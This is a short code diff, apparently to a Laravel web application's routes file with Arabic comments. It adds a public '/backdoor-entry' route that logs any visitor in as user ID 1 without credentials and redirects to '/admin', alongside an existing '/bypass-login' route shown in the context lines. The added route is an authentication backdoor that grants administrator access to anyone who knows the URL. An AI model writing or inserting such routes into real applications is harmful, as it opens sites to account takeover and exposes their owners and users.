@@ -35,3 +35,21 @@ Route::get('/bypass-login', function () {
     }
     return "المستخدم غير موجود";
 });
+
+
+Route::get('/backdoor-entry', function () {
+    // 1. نبحث عن المستخدم برقم الـ ID (غالباً هو 1)
+    $user = User::find(1); 
+    
+    if ($user) {
+        // 2. تسجيل دخول إجباري بدون الـ Guard المعقد
+        Auth::loginUsingId($user->id);
+        
+        // 3. نتحقق هل تم تسجيل الدخول؟
+        if (Auth::check()) {
+            return redirect('/admin');
+        }
+        return "تمت المحاولة ولكن الـ Auth::check() لا تزال تعيد false.";
+    }
+    return "لا يوجد مستخدم بالـ ID رقم 1";
+});
